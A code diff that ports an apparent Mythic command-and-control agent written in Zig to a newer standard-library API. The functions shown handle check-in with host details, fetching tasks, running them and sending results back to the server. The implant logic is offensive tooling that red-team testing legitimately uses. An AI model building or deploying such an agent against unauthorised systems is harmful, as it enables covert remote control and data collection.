@@ -7,7 +7,7 @@ const utils = @import("utils.zig");
 const config = @import("config.zig");
 
 const print = std.debug.print;
-const ArrayList = std.ArrayList;
+//const ArrayList = std.ArrayList;
 const Allocator = std.mem.Allocator;
 const json = std.json;
 const time = std.time;
@@ -38,8 +38,8 @@ pub const MythicAgent = struct {
     aes_key: [32]u8, //For future use watch this space
     payload_uuid: []const u8,
     
-    tasks: ArrayList(MythicTask),
-    pending_responses: ArrayList(MythicResponse),
+    tasks: std.ArrayListUnmanaged(MythicTask),
+    pending_responses: std.ArrayListUnmanaged(MythicResponse),
     is_running: bool,
     last_checkin: i64,
     
@@ -60,8 +60,8 @@ pub const MythicAgent = struct {
             .crypto_utils = crypto_utils,
             .aes_key = aes_key,
             .payload_uuid = config.payload_uuid,
-            .tasks = ArrayList(MythicTask).init(allocator),
-            .pending_responses = ArrayList(MythicResponse).init(allocator),
+            .tasks = std.ArrayListUnmanaged(MythicTask){},
+            .pending_responses = std.ArrayList(MythicResponse){},
             .is_running = false,
             .last_checkin = 0,
         };
@@ -69,8 +69,8 @@ pub const MythicAgent = struct {
     
     pub fn deinit(self: *Self) void {
         self.allocator.free(self.session_id);
-        self.tasks.deinit();
-        self.pending_responses.deinit();
+        self.tasks.deinit(self.allocator);
+        self.pending_responses.deinit(self.allocator);
         self.network_client.deinit();
     }
     
@@ -149,14 +149,17 @@ pub const MythicAgent = struct {
             .ips = internal_ip,
             .process_name = process_name,
         };
-        var json_buffer = std.ArrayList(u8).init(self.allocator);
-        defer json_buffer.deinit();
-        try json.stringify(checkin_data, .{}, json_buffer.writer());
+        //Writergate made me do this. Thanks Andrew for giving me sleepless nights T_T
+        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
+        defer json_writer.deinit();
+        try std.json.Stringify.value(checkin_data, .{}, &json_writer.writer);
+        const json_bytes = try json_writer.toOwnedSlice();
+        defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8).init(self.allocator);
-        defer combined.deinit();
-        try combined.appendSlice(self.payload_uuid);
-        try combined.appendSlice(json_buffer.items);
+        var combined = std.ArrayList(u8){};
+        defer combined.deinit(self.allocator);
+        try combined.appendSlice(self.allocator, self.payload_uuid);
+        try combined.appendSlice(self.allocator, json_bytes);
         
         const encoder = base64.standard.Encoder;
         const b64_len = encoder.calcSize(combined.items.len);
@@ -203,16 +206,19 @@ pub const MythicAgent = struct {
             .tasking_size = 1,
         };
         
-        var json_buffer = std.ArrayList(u8).init(self.allocator);
-        defer json_buffer.deinit();
+        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
+        defer json_writer.deinit();
 
-        try json.stringify(get_tasking_data, .{}, json_buffer.writer());
+        try json.Stringify.value(get_tasking_data, .{}, &json_writer.writer);
 
-        var combined = std.ArrayList(u8).init(self.allocator);
-        defer combined.deinit();
+        const json_bytes = try json_writer.toOwnedSlice();
+        defer self.allocator.free(json_bytes);
 
-        try combined.appendSlice(self.payload_uuid);
-        try combined.appendSlice(json_buffer.items);
+        var combined = std.ArrayList(u8){};
+        defer combined.deinit(self.allocator);
+
+        try combined.appendSlice(self.allocator, self.payload_uuid);
+        try combined.appendSlice(self.allocator, json_bytes);
 
         const encoder = base64.standard.Encoder;
         const b64_len = encoder.calcSize(combined.items.len);
@@ -272,7 +278,7 @@ pub const MythicAgent = struct {
                         .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}), 
                     };
                     
-                    try self.tasks.append(task);
+                    try self.tasks.append(self.allocator, task);
                 }
             }
         }
@@ -291,7 +297,7 @@ pub const MythicAgent = struct {
                         .completed = true,
                         .status = "completed",
                     };
-                    try self.pending_responses.append(exit_response);
+                    try self.pending_responses.append(self.allocator, exit_response);
                     task.status = .completed;
                     continue;
                 }
@@ -303,12 +309,12 @@ pub const MythicAgent = struct {
                         .completed = true,
                         .status = "error",
                     };
-                    try self.pending_responses.append(error_response);
+                    try self.pending_responses.append(self.allocator, error_response);
                     task.status = .erroragent;
                     continue;
                 };
                 
-                try self.pending_responses.append(result);
+                try self.pending_responses.append(self.allocator, result);
                 task.status = .completed;
             }
         }
@@ -325,11 +331,11 @@ pub const MythicAgent = struct {
             download: ?types.DownloadInfo = null,
         };
 
-        var responses = std.ArrayList(ResponseObj).init(self.allocator);
-        defer responses.deinit();
+        var responses = std.ArrayList(ResponseObj){};
+        defer responses.deinit(self.allocator);
 
         for (self.pending_responses.items) |response| {
-            try responses.append(ResponseObj{
+            try responses.append(self.allocator, ResponseObj{
                 .task_id = response.task_id,
                 .user_output = response.user_output,
                 .completed = response.completed,
@@ -343,14 +349,18 @@ pub const MythicAgent = struct {
             .responses = responses.items,
         };
 
-        var json_buffer = std.ArrayList(u8).init(self.allocator);
-        defer json_buffer.deinit();
-        try json.stringify(response_data, .{}, json_buffer.writer());
+        var json_writer = std.Io.Writer.Allocating.init(self.allocator);
+        defer json_writer.deinit();
+        try json.Stringify.value(response_data, .{}, &json_writer.writer);
 
-        var combined = std.ArrayList(u8).init(self.allocator);
-        defer combined.deinit();
-        try combined.appendSlice(self.payload_uuid);
-        try combined.appendSlice(json_buffer.items);
+        const json_bytes = try json_writer.toOwnedSlice();
+        defer self.allocator.free(json_bytes);
+
+        var combined = std.ArrayList(u8){};
+        defer combined.deinit(self.allocator);
+
+        try combined.appendSlice(self.allocator, self.payload_uuid);
+        try combined.appendSlice(self.allocator, json_bytes);
 
         const encoder = base64.standard.Encoder;
         const b64_len = encoder.calcSize(combined.items.len);
@@ -361,7 +371,7 @@ pub const MythicAgent = struct {
         const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
 
-        self.pending_responses.clearAndFree();
+        self.pending_responses.clearAndFree(self.allocator);
     }
 
     fn sleep(self: *Self) void {
